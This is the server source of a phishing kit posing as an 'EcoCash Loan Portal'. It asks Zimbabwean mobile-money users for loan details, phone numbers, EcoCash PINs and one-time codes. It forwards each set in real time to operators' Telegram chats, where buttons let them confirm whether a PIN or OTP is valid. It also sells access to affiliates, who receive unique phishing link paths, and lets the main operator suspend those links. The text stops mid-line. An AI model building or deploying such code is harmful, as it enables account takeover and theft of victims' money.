require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Persistent storage file path
const STORAGE_FILE = path.join(__dirname, 'admins_data.json');

// Load initial data from disk if it exists
function loadPersistentData() {
  try {
    if (fs.existsSync(STORAGE_FILE)) {
      const rawData = fs.readFileSync(STORAGE_FILE, 'utf8');
      const parsed = JSON.parse(rawData);
      return {
        authorizedUsers: new Map(parsed.authorizedUsers || []),
        secondaryAdmins: new Map(parsed.secondaryAdmins || []),
        pathToAdminChat: new Map(parsed.pathToAdminChat || []),
        pathStatus: new Map(parsed.pathStatus || []),
        adminCounter: parsed.adminCounter || 1
      };
    }
  } catch (err) {
    console.error("Error loading persistent data:", err);
  }
  return {
    authorizedUsers: new Map(),
    secondaryAdmins: new Map(),
    pathToAdminChat: new Map(),
    pathStatus: new Map(),
    adminCounter: 1
  };
}

// Save current maps to disk
function savePersistentData() {
  try {
    const dataToSave = {
      authorizedUsers: Array.from(authorizedUsers.entries()),
      secondaryAdmins: Array.from(secondaryAdmins.entries()),
      pathToAdminChat: Array.from(pathToAdminChat.entries()),
      pathStatus: Array.from(pathStatus.entries()),
      adminCounter
    };
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
  } catch (err) {
    console.error("Error saving persistent data:", err);
  }
}

const activeApplications = new Map();
const persisted = loadPersistentData();
const authorizedUsers = persisted.authorizedUsers;
const secondaryAdmins = persisted.secondaryAdmins;
const pathToAdminChat = persisted.pathToAdminChat;
const pathStatus = persisted.pathStatus;
let adminCounter = persisted.adminCounter;

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) {
    formattedPhone = formattedPhone.replace('+263', '');
  } else if (formattedPhone.startsWith('263')) {
    formattedPhone = formattedPhone.slice(3);
  } else if (formattedPhone.startsWith('0')) {
    formattedPhone = formattedPhone.slice(1);
  }
  return formattedPhone;
}

// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    
    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
    }

    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    // Strictly sanitize and validate portal path to prevent accidental cross-chat leaks
    let portalPath = data.portalPath || '';
    if (!portalPath.startsWith('/Admin-')) {
      portalPath = '/Admin-0001';
    }
    
    // Check if this specific link path has been suspended by the Main Admin
    if (pathStatus.get(portalPath) === 'SUSPENDED') {
      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended by the administration." });
    }
    
    // Explicitly target the chat mapped to this path
    const targetChatId = pathToAdminChat.get(portalPath);

    if (!targetChatId) {
      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });
    }

    activeApplications.set(appReference, {
      ...data,
      formattedPhone,
      portalPath,
      targetChatId,
      status: 'PIN_PENDING'
    });

    const botToken = process.env.TELEGRAM_BOT_TOKEN;

    if (botToken && targetChatId) {
      const currentTimestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Africa/Harare',
        year: 'numeric', month: 'numeric', day: 'numeric',
        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true
      });

      const messageText = `🔐 <b>ECOCASH CREDENTIALS (STEP 2)</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `🌐 <b>Portal Link Used:</b> ${portalPath}\n` +
                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
                          `🏢 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
                          `💵 <b>Monthly Income:</b> $${data.monthlyPayments || 'N/A'}\n` +
                          `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
                          `⏳ <b>Repayment:</b> ${data.repaymentTime || 'N/A'}\n` +
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                          `❓ <b>VERIFY PIN ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: targetChatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Credentials submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode } = req.body;
    const appData = activeApplications.get(appReference);

    if (!appData) {
      return res.status(404).json({ success: false, error: "Application reference not found" });
    }

    // Check if path got suspended midway
    if (pathStatus.get(appData.portalPath) === 'SUSPENDED') {
      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended." });
    }

    appData.otpCode = otpCode;
    appData.status = 'OTP_PENDING';
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const targetChatId = appData.targetChatId;

    if (botToken && targetChatId) {
      const messageText = `💬 <b>OTP CODE SUBMISSION (STEP 3)</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                          `🔑 <b>PIN:</b> <code>${appData.pin}</code>\n` +
                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
                          `❓ <b>VERIFY OTP ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: targetChatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("OTP submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// Status Polling Endpoint
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// Telegram Webhook Handler
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const masterChatId = process.env.TELEGRAM_CHAT_ID;

  if (req.body.message && req.body.message.text) {
    const message = req.body.message;
    const text = message.text.trim();
    const chatId = message.chat.id.toString();
    const user = message.from;

    if (text === '/start') {
      const userId = user.id;
      const firstName = user.first_name || 'N/A';
      const lastName = user.last_name || '';
      const fullName = `${firstName} ${lastName}`.trim();
      const username = user.username ? `@${user.username}` : 'No Username';
      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;

      const userStatus = authorizedUsers.get(userId);

      // Main Admin check
      if (chatId === masterChatId.toString()) {
        authorizedUsers.set(userId, 'PAID');
        const mainPath = '/Admin-0001';
        pathToAdminChat.set(mainPath, chatId);
        pathStatus.set(mainPath, 'ACTIVE');
        savePersistentData();

        const portalUrl = `https://${req.get('host')}${mainPath}`;
        const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
        });
        return;
      }

      // Secondary Admin who is already PAID
      if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
        const assignedPath = secondaryAdmins.get(userId);
        const portalUrl = `https://${req.get('host')}${assignedPath}`;
        
        // Ensure their chat ID maps directly to their specific path dynamically on /start
        pathToAdminChat.set(assignedPath, chatId);
        savePersistentData();

        const currentLinkStatus = pathStatus.get(assignedPath) || 'ACTIVE';
        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                `📌 <b>Link Status:</b> ${currentLinkStatus}\n` +
                                `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
        });
        return;
      }

      if (userStatus === 'UNPAID') {
        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })
        });
        return;
      }

      if (userStatus === 'PENDING') {
        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })
        });
        return;
      }

      // New user triggering /start -> Send registration request ONLY to Main Admin
      authorizedUsers.set(userId, 'PENDING');
      savePersistentData();

      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
                             `👤 <b>Name:</b> ${fullName}\n` +
                             `🏷 <b>Username:</b> ${username}\n` +
                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
                             `👇 <b>Select Access Status for this User:</b>`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: masterChatId,
          text: adminAlertText,
          parse_mode: 'HTML',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
              ]
            ]
          })
        })
      });

      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                              `Your access request has been sent to the main administrator for review.\n\n` +
                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })
      });
    }
    return;
  }

  const { callback_query } = req.body;
  if (!callback_query) return;

  const actionData = callback_query.data;
  const chatId = callback_query.message.chat.id.toString();
  const messageId = callback_query.message.message_id;

  if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
    if (chatId !== masterChatId.toString()) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
      });
      return;
    }

    const targetUserId = parseInt(actionData.split('_')[2], 10);
    const isPaid = actionData.startsWith('access_paid_');

    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');

    let assignedPath = '';
    if (isPaid) {
      if (!secondaryAdmins.has(targetUserId)) {
        adminCounter++;
        const paddedId = String(adminCounter).padStart(4, '0');
        assignedPath = `/Admin-${paddedId}`;
        secondaryAdmins.set(targetUserId, assignedPath);
        pathToAdminChat.set(assignedPath, targetUserId.toString());
        pathStatus.set(assignedPath, 'ACTIVE');
      } else {
        assignedPath = secondaryAdmins.get(targetUserId);
        pathToAdminChat.set(assignedPath, targetUserId.toString());
        if (!pathStatus.has(assignedPath)) {
          pathStatus.set(assignedPath, 'ACTIVE');
        }
      }
    }
    savePersistentData();

    const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
    
    // Append a toggle suspend button for this path if approved
    let replyMarkup = undefined;
    if (isPaid && assignedPath) {
      replyMarkup = JSON.stringify({
        inline_keyboard: [
          [
            { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${assignedPath}` }
          ]
        ]
      });
    }

    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, replyMarkup);

    const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';
    const notificationText = isPaid 
      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })
    });
    return;
  }

  // Handle Main Admin toggling specific path suspension/activation via inline button
  if (actionData.startsWith('toggle_suspend_')) {
    if (chatId !== masterChatId.toString()) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
      });
      return;
    }

    const targetPath = actionData.replace('toggle_suspend_', '');
    const currentStatus = pathStatus.get(targetPath) || 'ACTIVE';
    const newStatus = currentStatus === 'ACTIVE' ? 'SUSPENDED' : 'ACTIVE';
    
    pathStatus.set(targetPath, newStatus);
    savePersistentData();

    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback_query.id, text: `Link ${targetPath} is now ${newStatus}.`, show_alert: true })
    });

    // Update message to show current link status
    const linkStatusBadge = newStatus === 'ACTIVE' ? '🟢 ACTIVE' : '🔴 SUSPENDED';
    const updatedText = `${callback_query.message.text.split('\n\n📌 <b>Link State:</b>')[0]}\n\n📌 <b>Link State:</b> ${linkStatusBadge}`;
    
    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, JSON.stringify({
      inline_keyboard: [
        [
          { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${targetPath}` }
        ]
      ]
    }));
    return;
  }

  let targetAppRef = '';
  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');

  if (targetAppRef) {
    const appData = activeApplications.get(targetAppRef);
    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_
